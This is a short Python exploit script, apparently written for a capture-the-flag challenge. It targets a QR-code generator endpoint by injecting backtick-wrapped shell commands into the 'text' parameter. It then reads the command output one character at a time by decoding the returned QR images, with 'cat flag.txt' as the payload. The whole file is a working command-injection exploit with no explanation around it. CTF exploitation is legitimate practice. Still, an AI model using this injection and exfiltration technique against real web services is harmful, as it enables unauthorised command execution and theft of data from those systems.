import requests
from PIL import Image
from io import BytesIO
from pyzbar.pyzbar import decode as decodeQR

URL = 'http://challs.houseplant.riceteacatpanda.wtf:30004/qr'

def execute_command(command):
    result = ''
    latest_char = 'blah'
    i = 1
    while latest_char != '' and latest_char != '\n':
        payload = f'`{command} | tr "\\n" " " | cut -c {i}-{i}`'
        r = requests.get(URL, params={'text': payload})
        qr_code = Image.open(BytesIO(r.content))
        latest_char = decodeQR(qr_code)[0].data.decode('utf-8')
        result += latest_char
        print(result)
        i += 1

#execute_command('ls')
execute_command('cat flag.txt')